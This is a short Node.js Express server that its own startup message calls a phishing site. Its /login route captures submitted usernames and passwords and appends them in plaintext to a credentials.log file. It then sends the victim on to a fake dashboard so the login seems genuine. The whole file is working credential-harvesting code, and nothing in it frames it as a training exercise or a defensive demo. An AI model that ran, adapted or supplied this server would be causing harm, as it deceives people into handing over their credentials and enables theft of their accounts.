const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Log requests
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Parse form data
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Login route
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.send('<h1>Error</h1><p>Username and password are required.</p>');
  }

  const logEntry = `Username: ${username}, Password: ${password}\n`;
  fs.appendFile(path.join(__dirname, 'credentials.log'), logEntry, (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
      return res.status(500).send('<h1>Internal Server Error</h1>');
    }

    // Redirect to fake dashboard with username as a query parameter
    res.redirect(`/fake-dashboard?username=${encodeURIComponent(username)}`);
  });
});

// Serve the fake dashboard page
app.get('/fake-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'fake-dashboard.html'));
});

// Handle dynamic username in the dashboard
app.get('/api/user', (req, res) => {
  const username = req.query.username;
  if (username) {
    res.json({ username });
  } else {
    res.status(400).send('No username provided');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Phishing site running at http://localhost:${PORT}`);
});
